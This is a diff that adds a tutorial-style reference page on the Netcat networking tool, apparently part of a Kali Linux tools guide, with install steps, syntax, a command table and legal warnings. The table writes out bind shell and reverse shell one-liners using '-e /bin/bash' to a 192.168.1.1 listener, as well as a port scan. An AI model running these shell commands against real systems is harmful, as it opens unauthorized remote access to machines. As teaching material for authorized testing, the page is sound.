@@ -1,0 +1,58 @@
+Netcat
+Networking Swiss army knife for reading/writing network connections
+
+Sniffing & Spoofing
+Description
+Netcat (nc) is a versatile networking utility that reads and writes data across network connections using TCP or UDP. It can create almost any kind of connection and is used for port scanning, file transfers, and creating backdoors.
+
+Installation / Check
+Check if installed:
+
+which nc
+Install command:
+
+sudo apt install netcat
+Basic Syntax
+nc [options] <host> <port>
+Common Commands
+Command	What it does	When to use	Risk
+nc -lvp 4444
+
+Listen on port	Creating a listener for incoming connections	
+nc 192.168.1.1 4444
+
+Connect to port	Connecting to a remote listener	
+nc -lvp 4444 -e /bin/bash
+
+Bind shell	Creating a shell listener (dangerous!)	
+nc 192.168.1.1 4444 -e /bin/bash
+
+Reverse shell	Sending shell to listener	
+nc -zv 192.168.1.1 1-1000
+
+Port scan	Quick port scanning	
+nc -lvp 1234 > file.txt
+
+Receive file	File transfer (receiver)	
+Step-by-Step Guide
+1
+Decide if you need listener (-l) or client mode
+2
+Choose appropriate port
+3
+Add verbose (-v) for more info
+4
+For shells, use -e with caution
+5
+Monitor connections and data transfer
+Understanding the Output
+Netcat shows connection status and passes raw data through. Everything typed is sent to the other end.
+
+Important Warnings
+•
+Shells created with netcat are unencrypted
+•
+Bind shells are dangerous - anyone can connect
+•
+Use only on systems you own or have permission to test
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
